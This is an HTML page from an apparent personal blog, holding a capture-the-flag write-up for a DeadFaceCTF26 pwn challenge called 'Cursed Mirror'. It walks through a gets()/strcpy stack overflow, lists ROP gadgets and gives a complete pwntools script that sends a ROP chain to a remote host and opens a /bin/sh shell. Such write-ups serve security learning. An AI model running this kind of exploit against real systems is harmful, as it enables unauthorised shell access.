@@ -1,0 +1,1014 @@
+<!doctype html>
+<html lang="en">
+<head>
+  <meta charset="utf-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1">
+  <meta name="description" content="pwn">
+  <meta name="theme-color" content="#f3a9cb">
+  <meta property="og:title" content="DeadFaceCTF26 / Cursed Mirror">
+  <meta property="og:description" content="pwn">
+  <meta property="og:type" content="article">
+  <title>DeadFaceCTF26 / Cursed Mirror / Notes by a horse.</title>
+  <link rel="icon" href="assets/favicon.svg" type="image/svg+xml">
+  <script src="assets/theme.js"></script>
+  <link rel="stylesheet" href="assets/theme.css">
+  <link rel="stylesheet" href="assets/vendor/katex/katex.min.css">
+  <script src="assets/reader.js" defer></script>
+  
+</head>
+<body class="page-ctf">
+  <a class="skip-link" href="#content">Skip to content</a>
+  <div class="reading-progress" aria-hidden="true"><span></span></div>
+  <header class="site-header">
+    <a class="brand" href="index.html"><span class="brand-mark"><!-- @license lucide-static v0.468.0 - ISC -->
+<svg aria-hidden="true" focusable="false"   class="lucide lucide-notebook-pen"
+  xmlns="http://www.w3.org/2000/svg"
+  width="24"
+  height="24"
+  viewBox="0 0 24 24"
+  fill="none"
+  stroke="currentColor"
+  stroke-width="2"
+  stroke-linecap="round"
+  stroke-linejoin="round"
+>
+  <path d="M13.4 2H6a2 2 0 0 0-2 2v16a2 2 0 0 0 2 2h12a2 2 0 0 0 2-2v-7.4" />
+  <path d="M2 6h4" />
+  <path d="M2 10h4" />
+  <path d="M2 14h4" />
+  <path d="M2 18h4" />
+  <path d="M21.378 5.626a1 1 0 1 0-3.004-3.004l-5.01 5.012a2 2 0 0 0-.506.854l-.837 2.87a.5.5 0 0 0 .62.62l2.87-.837a2 2 0 0 0 .854-.506z" />
+</svg>
+</span><span>Notes by a horse.<small>Yes. A. Literal. Horse.</small></span></a>
+    <nav class="site-nav" aria-label="Main navigation">
+      <a href="index.html">Home</a>
+      <a href="archive.html?kind=article" data-nav-kind="article">Journal</a>
+      <a href="archive.html?kind=ctf" data-nav-kind="ctf" aria-current="page">Writeups</a>
+      
+    </nav>
+    <div class="header-tools"><button class="icon-button theme-toggle" type="button" title="Switch to dark mode" aria-label="Switch to dark mode" aria-pressed="false"><span class="theme-moon"><!-- @license lucide-static v0.468.0 - ISC -->
+<svg aria-hidden="true" focusable="false"   class="lucide lucide-moon"
+  xmlns="http://www.w3.org/2000/svg"
+  width="24"
+  height="24"
+  viewBox="0 0 24 24"
+  fill="none"
+  stroke="currentColor"
+  stroke-width="2"
+  stroke-linecap="round"
+  stroke-linejoin="round"
+>
+  <path d="M12 3a6 6 0 0 0 9 9 9 9 0 1 1-9-9Z" />
+</svg>
+</span><span class="theme-sun"><!-- @license lucide-static v0.468.0 - ISC -->
+<svg aria-hidden="true" focusable="false"   class="lucide lucide-sun"
+  xmlns="http://www.w3.org/2000/svg"
+  width="24"
+  height="24"
+  viewBox="0 0 24 24"
+  fill="none"
+  stroke="currentColor"
+  stroke-width="2"
+  stroke-linecap="round"
+  stroke-linejoin="round"
+>
+  <circle cx="12" cy="12" r="4" />
+  <path d="M12 2v2" />
+  <path d="M12 20v2" />
+  <path d="m4.93 4.93 1.41 1.41" />
+  <path d="m17.66 17.66 1.41 1.41" />
+  <path d="M2 12h2" />
+  <path d="M20 12h2" />
+  <path d="m6.34 17.66-1.41 1.41" />
+  <path d="m19.07 4.93-1.41 1.41" />
+</svg>
+</span></button><button class="icon-button library-button" type="button" title="Open notebook" aria-label="Open notebook"><!-- @license lucide-static v0.468.0 - ISC -->
+<svg aria-hidden="true" focusable="false"   class="lucide lucide-book-open"
+  xmlns="http://www.w3.org/2000/svg"
+  width="24"
+  height="24"
+  viewBox="0 0 24 24"
+  fill="none"
+  stroke="currentColor"
+  stroke-width="2"
+  stroke-linecap="round"
+  stroke-linejoin="round"
+>
+  <path d="M12 7v14" />
+  <path d="M3 18a1 1 0 0 1-1-1V4a1 1 0 0 1 1-1h5a4 4 0 0 1 4 4 4 4 0 0 1 4-4h5a1 1 0 0 1 1 1v13a1 1 0 0 1-1 1h-6a3 3 0 0 0-3 3 3 3 0 0 0-3-3z" />
+</svg>
+</button></div>
+  </header>
+  <aside class="toc-rail" aria-label="On this page"><span class="rail-title">ON THIS PAGE</span><nav><a href="#solve" class="toc-link" data-heading="solve"><span class="toc-mark" aria-hidden="true">01</span><span class="toc-label">Solve</span></a></nav><a class="rail-top" href="#top" aria-label="Back to top"><!-- @license lucide-static v0.468.0 - ISC -->
+<svg aria-hidden="true" focusable="false"   class="lucide lucide-arrow-up"
+  xmlns="http://www.w3.org/2000/svg"
+  width="24"
+  height="24"
+  viewBox="0 0 24 24"
+  fill="none"
+  stroke="currentColor"
+  stroke-width="2"
+  stroke-linecap="round"
+  stroke-linejoin="round"
+>
+  <path d="m5 12 7-7 7 7" />
+  <path d="M12 19V5" />
+</svg>
+</a></aside>
+  <main id="content" class="page-shell">
+    
+    <article id="top">
+      <header class="article-header">
+        <div class="article-eyebrow"><span class="category-sticker">CAPTURE THE FLAG</span><span class="edition">NO. 001 / AN OPEN NOTEBOOK</span></div>
+        <h1>DeadFaceCTF26 / Cursed Mirror<span class="title-dot" aria-hidden="true">.</span></h1>
+        <p class="article-deck">pwn</p>
+        <div class="byline"><span class="author-avatar" aria-hidden="true">A</span><a class="author-name" href="https://github.com/Adrian-C-1" target="_blank" rel="noopener noreferrer">Adrian-C-1</a><span class="byline-divider">/</span><time datetime="2026-10-19">Oct 19, 2026</time><span class="reading-time"><!-- @license lucide-static v0.468.0 - ISC -->
+<svg aria-hidden="true" focusable="false"   class="lucide lucide-clock"
+  xmlns="http://www.w3.org/2000/svg"
+  width="24"
+  height="24"
+  viewBox="0 0 24 24"
+  fill="none"
+  stroke="currentColor"
+  stroke-width="2"
+  stroke-linecap="round"
+  stroke-linejoin="round"
+>
+  <circle cx="12" cy="12" r="10" />
+  <polyline points="12 6 12 12 16 14" />
+</svg>
+ 11 min read</span></div>
+        <div class="article-tags"><span>pwn</span><span>DeadFaceCTF26</span><span class="status-tag">NOTES, NOT SECRETS <!-- @license lucide-static v0.468.0 - ISC -->
+<svg aria-hidden="true" focusable="false"   class="lucide lucide-arrow-up-right"
+  xmlns="http://www.w3.org/2000/svg"
+  width="24"
+  height="24"
+  viewBox="0 0 24 24"
+  fill="none"
+  stroke="currentColor"
+  stroke-width="2"
+  stroke-linecap="round"
+  stroke-linejoin="round"
+>
+  <path d="M7 7h10v10" />
+  <path d="M7 17 17 7" />
+</svg>
+</span></div>
+        <dl class="challenge-facts"><div><dt>category</dt><dd>pwn</dd></div><div><dt>event</dt><dd><a href="archive.html?kind=ctf&amp;event=deadfacectf26">DeadFaceCTF26</a></dd></div></dl>
+      </header>
+      <div class="article-body prose"><p>.esroH</p>
+<h2 id="solve"><a class="heading-anchor" href="#solve" aria-label="Link to Solve">#</a>Solve</h2>
+<figure class="code-block"><figcaption><span>c</span><button class="copy-code" type="button" aria-label="Copy code" title="Copy code"><span class="copy-icon" aria-hidden="true"></span><span class="copy-label">Copy</span></button></figcaption><pre tabindex="0"><code class="hljs language-c"><span class="hljs-type">int</span> <span class="hljs-title function_">print_menu</span><span class="hljs-params">()</span>
+{
+  <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;\n\n========================================================&quot;</span>);
+  <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;Before you hangs the old mirror.&quot;</span>);
+  <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;Its ornate, cobweb-covered frame hides a horrifying secret.&quot;</span>);
+  <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;What will you do?&quot;</span>);
+  <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;\n1.) Break The Mirror&quot;</span>);
+  <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;\n2.) Ask the Mirror a Question&quot;</span>);
+  <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;\n3.) Gaze deep into the Mirror&quot;</span>);
+  <span class="hljs-keyword">return</span> <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;\n============================================================&quot;</span>);
+}
+</code></pre></figure>
+<p>1 is useless, just leaves.</p>
+<p>3 has the following strings in it (reversed):</p>
+<ul>
+<li><code>/home/hackerman/supersecretfile.txt</code></li>
+<li><code>calc.exe</code></li>
+<li><code>/bin/sh</code></li>
+<li><code>Hi mom, im on the programs strings!</code></li>
+<li><code>deadfaceCTF!</code></li>
+<li><code>hackemall1997</code></li>
+<li><code>hg/nif/</code></li>
+<li><code>Black sphinx of Quartz, Hear My Vow</code></li>
+<li><code>If you like undertale, try deltarune</code></li>
+</ul>
+<p>2 does the following:</p>
+<figure class="code-block"><figcaption><span>c</span><button class="copy-code" type="button" aria-label="Copy code" title="Copy code"><span class="copy-icon" aria-hidden="true"></span><span class="copy-label">Copy</span></button></figcaption><pre tabindex="0"><code class="hljs language-c"><span class="hljs-type">int</span> <span class="hljs-title function_">question</span><span class="hljs-params">()</span>
+{
+  <span class="hljs-type">char</span> dest[<span class="hljs-number">256</span>]; <span class="hljs-comment">// [rsp+0h] [rbp-140h] BYREF</span>
+  <span class="hljs-type">char</span> src[<span class="hljs-number">64</span>]; <span class="hljs-comment">// [rsp+100h] [rbp-40h] BYREF</span>
+
+  <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;\nwords are scrawled like mist on the mirrors surface-&quot;</span>);
+  <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;What would you seek?:&quot;</span>);
+  gets(src);
+  <span class="hljs-built_in">strcpy</span>(dest, src);
+  <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;\n\n\n...The Mirror Replies: &quot;</span>);
+  reflect(dest);
+  <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;%s&quot;</span>, dest);
+  <span class="hljs-keyword">return</span> getchar();
+}
+</code></pre></figure>
+<figure class="code-block"><figcaption><span>c</span><button class="copy-code" type="button" aria-label="Copy code" title="Copy code"><span class="copy-icon" aria-hidden="true"></span><span class="copy-label">Copy</span></button></figcaption><pre tabindex="0"><code class="hljs language-c"><span class="hljs-type">void</span> __fastcall <span class="hljs-title function_">reflect</span><span class="hljs-params">(<span class="hljs-type">const</span> <span class="hljs-type">char</span> *a1)</span>
+{
+  <span class="hljs-comment">// reverses based on strlen()</span>
+  <span class="hljs-type">char</span> v1; <span class="hljs-comment">// [rsp+17h] [rbp-9h]</span>
+  <span class="hljs-type">int</span> i; <span class="hljs-comment">// [rsp+18h] [rbp-8h]</span>
+  <span class="hljs-type">int</span> v3; <span class="hljs-comment">// [rsp+1Ch] [rbp-4h]</span>
+
+  <span class="hljs-keyword">if</span> ( a1 &amp;&amp; *a1 )
+  {
+    v3 = <span class="hljs-number">0</span>;
+    <span class="hljs-keyword">for</span> ( i = <span class="hljs-built_in">strlen</span>(a1) - <span class="hljs-number">1</span>; v3 &lt; i; --i )
+    {
+      v1 = a1[v3];
+      a1[v3] = a1[i];
+      a1[i] = v1;
+      ++v3;
+    }
+  }
+}
+</code></pre></figure>
+<p>Libc functions for reference:</p>
+<figure class="code-block"><figcaption><span>c</span><button class="copy-code" type="button" aria-label="Copy code" title="Copy code"><span class="copy-icon" aria-hidden="true"></span><span class="copy-label">Copy</span></button></figcaption><pre tabindex="0"><code class="hljs language-c"><span class="hljs-type">char</span>* <span class="hljs-title function_">strcpy</span><span class="hljs-params">(<span class="hljs-type">char</span>* __restrict dst, <span class="hljs-type">const</span> <span class="hljs-type">char</span>* __restrict src)</span>
+{
+	<span class="hljs-type">const</span> <span class="hljs-type">size_t</span> length = <span class="hljs-built_in">strlen</span>(src);
+	<span class="hljs-built_in">memcpy</span>(dst, src, length + <span class="hljs-number">1</span>);
+	<span class="hljs-keyword">return</span> dst;
+}
+</code></pre></figure>
+<figure class="code-block"><figcaption><span>c</span><button class="copy-code" type="button" aria-label="Copy code" title="Copy code"><span class="copy-icon" aria-hidden="true"></span><span class="copy-label">Copy</span></button></figcaption><pre tabindex="0"><code class="hljs language-c"><span class="hljs-type">int</span> <span class="hljs-title function_">STRLEN</span> <span class="hljs-params">(<span class="hljs-type">const</span> <span class="hljs-type">char</span> *str)</span>
+{
+  <span class="hljs-type">const</span> <span class="hljs-type">char</span> *char_ptr;
+  <span class="hljs-type">const</span> <span class="hljs-type">unsigned</span> <span class="hljs-type">long</span> <span class="hljs-type">int</span> *longword_ptr;
+  
+  <span class="hljs-keyword">for</span> (char_ptr = str; ((<span class="hljs-type">unsigned</span> <span class="hljs-type">long</span> <span class="hljs-type">int</span>) char_ptr
+			&amp; (<span class="hljs-keyword">sizeof</span> (longword) - <span class="hljs-number">1</span>)) != <span class="hljs-number">0</span>;
+       ++char_ptr)
+    <span class="hljs-keyword">if</span> (*char_ptr == <span class="hljs-string">&#x27;\0&#x27;</span>)
+      <span class="hljs-keyword">return</span> char_ptr - str;
+      ...
+}
+</code></pre></figure>
+<figure class="code-block"><figcaption><span>c</span><button class="copy-code" type="button" aria-label="Copy code" title="Copy code"><span class="copy-icon" aria-hidden="true"></span><span class="copy-label">Copy</span></button></figcaption><pre tabindex="0"><code class="hljs language-c"><span class="hljs-type">void</span> *<span class="hljs-title function_">memcpy</span> <span class="hljs-params">(<span class="hljs-type">void</span> *dest, <span class="hljs-type">const</span> <span class="hljs-type">void</span> *src, <span class="hljs-type">size_t</span> len)</span>
+{
+  <span class="hljs-type">char</span> *d = dest;
+  <span class="hljs-type">const</span> <span class="hljs-type">char</span> *s = src;
+  <span class="hljs-keyword">while</span> (len--)
+    *d++ = *s++;
+  <span class="hljs-keyword">return</span> dest;
+}
+</code></pre></figure>
+<figure class="code-block"><figcaption><span>c</span><button class="copy-code" type="button" aria-label="Copy code" title="Copy code"><span class="copy-icon" aria-hidden="true"></span><span class="copy-label">Copy</span></button></figcaption><pre tabindex="0"><code class="hljs language-c"><span class="hljs-type">char</span> * <span class="hljs-title function_">gets</span><span class="hljs-params">(<span class="hljs-type">char</span> *buf)</span>
+{
+	<span class="hljs-type">int</span> c;
+	<span class="hljs-type">char</span> *s;
+	FLOCKFILE(<span class="hljs-built_in">stdin</span>);
+	<span class="hljs-keyword">for</span> (s = buf; (c = getchar_unlocked()) != <span class="hljs-string">&#x27;\n&#x27;</span>;)
+		<span class="hljs-keyword">if</span> (c == EOF)
+			<span class="hljs-keyword">if</span> (s == buf) {
+				FUNLOCKFILE(<span class="hljs-built_in">stdin</span>);
+				<span class="hljs-keyword">return</span> (<span class="hljs-literal">NULL</span>);
+			} <span class="hljs-keyword">else</span>
+				<span class="hljs-keyword">break</span>;
+		<span class="hljs-keyword">else</span>
+			*s++ = c;
+	*s = <span class="hljs-string">&#x27;\0&#x27;</span>;
+	FUNLOCKFILE(<span class="hljs-built_in">stdin</span>);
+	<span class="hljs-keyword">return</span> (buf);
+}
+</code></pre></figure>
+<p>The main issue is how it will handle the <code>strcpy</code> and reversing of the data.</p>
+<p>Since <code>dest</code> is below <code>src</code>, we should be fine.
+Win function is at <code>0x40180D</code>, executes whatever we put in <code>rdi</code>.</p>
+<p>ROP gadgets:</p>
+<figure class="code-block"><figcaption><span>text</span><button class="copy-code" type="button" aria-label="Copy code" title="Copy code"><span class="copy-icon" aria-hidden="true"></span><span class="copy-label">Copy</span></button></figcaption><pre tabindex="0"><code class="hljs language-text">0x0000000000401137 : adc byte ptr [rax], al ; add byte ptr [rax], al ; jmp 0x401020
+0x0000000000401077 : add al, 0 ; add byte ptr [rax], al ; jmp 0x401020
+0x0000000000401057 : add al, byte ptr [rax] ; add byte ptr [rax], al ; jmp 0x401020
+0x0000000000401ba1 : add al, ch ; jmp 0xffffffffc0401b9c
+0x000000000040119b : add bh, bh ; loopne 0x401205 ; nop ; ret
+0x0000000000401209 : add byte ptr [r8], r8b ; add dword ptr [rbp - 0x3d], ebx ; nop ; ret
+0x0000000000401008 : add byte ptr [r8], r8b ; test rax, rax ; je 0x401012 ; call rax
+0x0000000000401b9f : add byte ptr [rax], al ; add al, ch ; jmp 0xffffffffc0401b9c
+0x000000000040121c : add byte ptr [rax], al ; add byte ptr [rax], al ; endbr64 ; jmp 0x4011b0
+0x0000000000401037 : add byte ptr [rax], al ; add byte ptr [rax], al ; jmp 0x401020
+0x0000000000401168 : add byte ptr [rax], al ; add byte ptr [rax], al ; nop dword ptr [rax] ; ret
+0x000000000040120a : add byte ptr [rax], al ; add dword ptr [rbp - 0x3d], ebx ; nop ; ret
+0x000000000040121e : add byte ptr [rax], al ; endbr64 ; jmp 0x4011b0
+0x0000000000401039 : add byte ptr [rax], al ; jmp 0x401020
+0x000000000040175e : add byte ptr [rax], al ; jmp 0x4017a0
+0x000000000040116a : add byte ptr [rax], al ; nop dword ptr [rax] ; ret
+0x0000000000401034 : add byte ptr [rax], al ; push 0 ; jmp 0x401020
+0x0000000000401009 : add byte ptr [rax], al ; test rax, rax ; je 0x401012 ; call rax
+0x000000000040120b : add byte ptr [rcx], al ; pop rbp ; ret
+0x000000000040119a : add dil, dil ; loopne 0x401205 ; nop ; ret
+0x0000000000401047 : add dword ptr [rax], eax ; add byte ptr [rax], al ; jmp 0x401020
+0x000000000040120c : add dword ptr [rbp - 0x3d], ebx ; nop ; ret
+0x00000000004019d5 : add dword ptr [rbx + 0x453bfc45], ecx ; clc ; jl 0x401989 ; jmp 0x4019e1
+0x0000000000401207 : add eax, 0x4fdb ; add dword ptr [rbp - 0x3d], ebx ; nop ; ret
+0x0000000000401067 : add eax, dword ptr [rax] ; add byte ptr [rax], al ; jmp 0x401020
+0x0000000000401013 : add esp, 8 ; ret
+0x0000000000401012 : add rsp, 8 ; ret
+0x000000000040170f : and byte ptr [rax - 0x77], cl ; jge 0x4016fc ; jmp 0x4017fa
+0x0000000000401675 : call qword ptr [rax + 0x4855c35d]
+0x000000000040186d : call qword ptr [rax + 0x4855c3c9]
+0x0000000000401808 : call qword ptr [rax + 0x55c3c990]
+0x0000000000401c8a : call qword ptr [rax - 0xbd018]
+0x000000000040194f : call qword ptr [rbp + 0x48]
+0x0000000000401010 : call rax
+0x00000000004019db : clc ; jl 0x401989 ; jmp 0x4019e1
+0x0000000000401986 : clc ; jmp 0x4019d6
+0x000000000040175b : clc ; mov word ptr [rax], es ; add byte ptr [rax], al ; jmp 0x4017a0
+0x00000000004019d8 : cld ; cmp eax, dword ptr [rbp - 8] ; jl 0x401989 ; jmp 0x4019e1
+0x0000000000401223 : cli ; jmp 0x4011b0
+0x0000000000401b42 : cmp dword ptr [rbp - 4], 2 ; je 0x401b70 ; jmp 0x401c7c
+0x0000000000401cf6 : cmp eax, 2 ; je 0x401d09 ; jmp 0x401d21
+0x00000000004019d9 : cmp eax, dword ptr [rbp - 8] ; jl 0x401989 ; jmp 0x4019e1
+0x0000000000401220 : endbr64 ; jmp 0x4011b0
+0x0000000000401198 : enter 0x4061, 0 ; jmp rax
+0x0000000000401208 : fisttp dword ptr [rdi] ; add byte ptr [rcx], al ; pop rbp ; ret
+0x0000000000401a76 : idiv bh ; call qword ptr [rax + 0x4855c3c9]
+0x000000000040197e : idiv bh ; inc dword ptr [rbx + 0x458901e8] ; clc ; jmp 0x4019d6
+0x0000000000401923 : idiv edi ; call qword ptr [rax + 0x4855c35d]
+0x000000000040194d : idiv edi ; call qword ptr [rbp + 0x48]
+0x0000000000401a75 : idiv r15b ; call qword ptr [rax + 0x4855c3c9]
+0x000000000040170e : in al, dx ; and byte ptr [rax - 0x77], cl ; jge 0x4016fc ; jmp 0x4017fa
+0x000000000040170b : in eax, 0x48 ; sub esp, 0x20 ; mov qword ptr [rbp - 0x18], rdi ; jmp 0x4017fa
+0x0000000000401980 : inc dword ptr [rbx + 0x458901e8] ; clc ; jmp 0x4019d6
+0x0000000000401692 : iretd
+0x00000000004010e2 : jb 0x401133 ; add byte ptr [rax], al ; push 0xb ; jmp 0x401020
+0x000000000040100e : je 0x401012 ; call rax
+0x0000000000401195 : je 0x4011a0 ; mov edi, 0x4061c8 ; jmp rax
+0x00000000004011d7 : je 0x4011e0 ; mov edi, 0x4061c8 ; jmp rax
+0x0000000000401b40 : je 0x401b4d ; cmp dword ptr [rbp - 4], 2 ; je 0x401b70 ; jmp 0x401c7c
+0x0000000000401b46 : je 0x401b70 ; jmp 0x401c7c
+0x0000000000401cf4 : je 0x401cfd ; cmp eax, 2 ; je 0x401d09 ; jmp 0x401d21
+0x0000000000401cf9 : je 0x401d09 ; jmp 0x401d21
+0x0000000000401712 : jge 0x4016fc ; jmp 0x4017fa
+0x00000000004019dc : jl 0x401989 ; jmp 0x4019e1
+0x000000000040119c : jmp rax
+0x0000000000401803 : jne 0x401719 ; nop ; nop ; leave ; ret
+0x00000000004010d2 : jp 0x401123 ; add byte ptr [rax], al ; push 0xa ; jmp 0x401020
+0x0000000000401706 : leave ; ret
+0x000000000040119d : loopne 0x401205 ; nop ; ret
+0x0000000000401da4 : loopne 0x401e05 ; ret
+0x0000000000401206 : mov byte ptr [rip + 0x4fdb], 1 ; pop rbp ; ret
+0x0000000000401062 : mov dl, 0x4f ; add byte ptr [rax], al ; push 3 ; jmp 0x401020
+0x0000000000401711 : mov dword ptr [rbp - 0x18], edi ; jmp 0x4017fa
+0x0000000000401784 : mov dword ptr [rbp - 8], 0x46 ; jmp 0x4017a0
+0x0000000000401759 : mov dword ptr [rbp - 8], 0x8c ; jmp 0x4017a0
+0x0000000000401984 : mov dword ptr [rbp - 8], eax ; jmp 0x4019d6
+0x00000000004019d6 : mov eax, dword ptr [rbp - 4] ; cmp eax, dword ptr [rbp - 8] ; jl 0x401989 ; jmp 0x4019e1
+0x0000000000401197 : mov edi, 0x4061c8 ; jmp rax
+0x0000000000401052 : mov edx, 0x6800004f ; add al, byte ptr [rax] ; add byte ptr [rax], al ; jmp 0x401020
+0x0000000000401710 : mov qword ptr [rbp - 0x18], rdi ; jmp 0x4017fa
+0x0000000000401783 : mov qword ptr [rbp - 8], 0x46 ; jmp 0x4017a0
+0x0000000000401758 : mov qword ptr [rbp - 8], 0x8c ; jmp 0x4017a0
+0x000000000040175c : mov word ptr [rax], es ; add byte ptr [rax], al ; jmp 0x4017a0
+0x0000000000401082 : movabs byte ptr [0x56800004f], al ; jmp 0x401020
+0x0000000000401705 : nop ; leave ; ret
+0x0000000000401809 : nop ; nop ; leave ; ret
+0x0000000000401676 : nop ; pop rbp ; ret
+0x000000000040119f : nop ; ret
+0x000000000040116c : nop dword ptr [rax] ; ret
+0x00000000004010f7 : or al, 0 ; add byte ptr [rax], al ; jmp 0x401020
+0x00000000004010d7 : or al, byte ptr [rax] ; add byte ptr [rax], al ; jmp 0x401020
+0x00000000004010b7 : or byte ptr [rax], al ; add byte ptr [rax], al ; jmp 0x401020
+0x0000000000401757 : or cl, byte ptr [rax - 0x39] ; clc ; mov word ptr [rax], es ; add byte ptr [rax], al ; jmp 0x4017a0
+0x00000000004010c7 : or dword ptr [rax], eax ; add byte ptr [rax], al ; jmp 0x401020
+0x0000000000401196 : or dword ptr [rdi + 0x4061c8], edi ; jmp rax
+0x00000000004010e7 : or eax, dword ptr [rax] ; add byte ptr [rax], al ; jmp 0x401020
+0x000000000040120d : pop rbp ; ret
+0x0000000000401da5 : pop rdi ; ret
+0x0000000000401112 : pop rdx ; add byte ptr [r8], r8b ; push 0xe ; jmp 0x401020
+0x0000000000401da8 : pop rdx ; ret
+0x0000000000401da7 : pop rsi ; pop rdx ; ret
+0x0000000000401036 : push 0 ; jmp 0x401020
+0x0000000000401136 : push 0x10 ; jmp 0x401020
+0x00000000004010f2 : push 0x4f ; add byte ptr [rax], al ; push 0xc ; jmp 0x401020
+0x0000000000401122 : push rdx ; add byte ptr [r8], r8b ; push 0xf ; jmp 0x401020
+0x0000000000401016 : ret
+0x00000000004019a8 : ror byte ptr [rbx + 0x6348fc55], 1 ; retf 0x8b48
+0x000000000040100d : sal byte ptr [rdx + rax - 1], 0xd0 ; add rsp, 8 ; ret
+0x00000000004017cb : scasd eax, dword ptr [rdi] ; ret 0xc148
+0x0000000000401072 : stosb byte ptr [rdi], al ; add byte ptr [r8], r8b ; push 4 ; jmp 0x401020
+0x00000000004019dd : stosd dword ptr [rdi], eax ; jmp 0x4019e1
+0x0000000000401981 : sub eax, 1 ; mov dword ptr [rbp - 8], eax ; jmp 0x4019d6
+0x000000000040170d : sub esp, 0x20 ; mov qword ptr [rbp - 0x18], rdi ; jmp 0x4017fa
+0x0000000000401dad : sub esp, 8 ; add rsp, 8 ; ret
+0x000000000040170c : sub rsp, 0x20 ; mov qword ptr [rbp - 0x18], rdi ; jmp 0x4017fa
+0x0000000000401dac : sub rsp, 8 ; add rsp, 8 ; ret
+0x000000000040100c : test eax, eax ; je 0x401012 ; call rax
+0x0000000000401193 : test eax, eax ; je 0x4011a0 ; mov edi, 0x4061c8 ; jmp rax
+0x00000000004011d5 : test eax, eax ; je 0x4011e0 ; mov edi, 0x4061c8 ; jmp rax
+0x000000000040100b : test rax, rax ; je 0x401012 ; call rax
+0x00000000004010a2 : xchg edx, eax ; add byte ptr [r8], r8b ; push 7 ; jmp 0x401020
+</code></pre></figure>
+<p><code>question</code> is at <code>0x4019E3</code>.
+La iesire, <code>rcx</code> are pointer catre <code>input[1]</code> (ignora primul caracter).
+Nu avem gadgeturi cu <code>rcx</code>.
+<code>rax</code> are <code>0xA</code>.
+<code>0x0000000000401da7 : pop rsi ; pop rdx ; ret</code>
+Avem <code>0x0000000000401da5 : pop rdi ; ret</code>, dar trebuia sa aflam cumva pointerul catre inputul nostru.
+We can call <code>question</code> again, if that’s useful somehow.
+La <code>0x0406188</code> am <code>/bin/sh</code> invers, trb reversed.
+<code>reflect</code> e la <code>0x401950</code> si da reverse la un string din <code>rdi</code>.</p>
+<figure class="code-block"><figcaption><span>solve.py</span><button class="copy-code" type="button" aria-label="Copy code" title="Copy code"><span class="copy-icon" aria-hidden="true"></span><span class="copy-label">Copy</span></button></figcaption><pre tabindex="0"><code class="hljs language-python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *
+
+context.log_level = <span class="hljs-string">&#x27;error&#x27;</span> 
+
+p = remote(<span class="hljs-string">&quot;159.65.228.107&quot;</span>, <span class="hljs-number">5003</span>)
+
+p.recvuntil(<span class="hljs-string">b&quot;&gt; &quot;</span>)
+p.send(<span class="hljs-string">b&quot;2\n&quot;</span>)
+
+p.recvuntil(<span class="hljs-string">b&quot;you seek?:&quot;</span>)
+
+rdi_g_addr = <span class="hljs-number">0x0000000000401da5</span>
+win_addr = <span class="hljs-number">0x40180D</span> <span class="hljs-comment"># needs rdi = pointer to string for system(string)</span>
+question_addr = <span class="hljs-number">0x4019E3</span>
+reflect_addr = <span class="hljs-number">0x401950</span> <span class="hljs-comment"># are nev de rdi</span>
+binsh_rev_addr = <span class="hljs-number">0x0406188</span> <span class="hljs-comment"># /bin/sh hardcoded but reversed</span>
+ret_addr = <span class="hljs-number">0x4019E2</span> 
+
+rop = p64(ret_addr) + \
+      p64(rdi_g_addr) + p64(binsh_rev_addr) + p64(reflect_addr) + \
+      p64(ret_addr) + \
+      p64(rdi_g_addr) + p64(binsh_rev_addr) + p64(win_addr)
+pd = <span class="hljs-string">b&#x27;a&#x27;</span> * <span class="hljs-number">0x3F</span> + <span class="hljs-string">b&quot;\x00&quot;</span> +    <span class="hljs-string">b&#x27;b&#x27;</span> * <span class="hljs-number">8</span>    + rop + <span class="hljs-string">b&quot;\n&quot;</span>
+
+p.send(pd)
+
+p.interactive() 
+
+p.close()
+</code></pre></figure>
+</div>
+      <footer class="article-footer"><span class="end-mark"><!-- @license lucide-static v0.468.0 - ISC -->
+<svg aria-hidden="true" focusable="false"   class="lucide lucide-command"
+  xmlns="http://www.w3.org/2000/svg"
+  width="24"
+  height="24"
+  viewBox="0 0 24 24"
+  fill="none"
+  stroke="currentColor"
+  stroke-width="2"
+  stroke-linecap="round"
+  stroke-linejoin="round"
+>
+  <path d="M15 6v12a3 3 0 1 0 3-3H6a3 3 0 1 0 3 3V6a3 3 0 1 0-3 3h12a3 3 0 1 0-3-3" />
+</svg>
+</span><p>End of the note. Beginning of the rabbit hole.</p><a href="#top">Back to top <!-- @license lucide-static v0.468.0 - ISC -->
+<svg aria-hidden="true" focusable="false"   class="lucide lucide-arrow-up"
+  xmlns="http://www.w3.org/2000/svg"
+  width="24"
+  height="24"
+  viewBox="0 0 24 24"
+  fill="none"
+  stroke="currentColor"
+  stroke-width="2"
+  stroke-linecap="round"
+  stroke-linejoin="round"
+>
+  <path d="m5 12 7-7 7 7" />
+  <path d="M12 19V5" />
+</svg>
+</a></footer>
+    </article>
+    <section class="event-series" aria-labelledby="event-series-title"><div class="collection-section-heading"><div><span class="collection-kicker">MORE FROM THIS CTF / 10 WRITEUPS</span><h2 id="event-series-title">DeadFaceCTF26</h2></div><a class="browse-link" href="archive.html?kind=ctf&amp;event=deadfacectf26">All challenges <!-- @license lucide-static v0.468.0 - ISC -->
+<svg aria-hidden="true" focusable="false"   class="lucide lucide-arrow-right"
+  xmlns="http://www.w3.org/2000/svg"
+  width="24"
+  height="24"
+  viewBox="0 0 24 24"
+  fill="none"
+  stroke="currentColor"
+  stroke-width="2"
+  stroke-linecap="round"
+  stroke-linejoin="round"
+>
+  <path d="M5 12h14" />
+  <path d="m12 5 7 7-7 7" />
+</svg>
+</a></div><ol class="event-siblings"><li><a href="deadfacectf26-Necromancy.html"><span>DeadFaceCTF26 / Necromancy</span><small>Oct 21, 2026</small><!-- @license lucide-static v0.468.0 - ISC -->
+<svg aria-hidden="true" focusable="false"   class="lucide lucide-arrow-up-right"
+  xmlns="http://www.w3.org/2000/svg"
+  width="24"
+  height="24"
+  viewBox="0 0 24 24"
+  fill="none"
+  stroke="currentColor"
+  stroke-width="2"
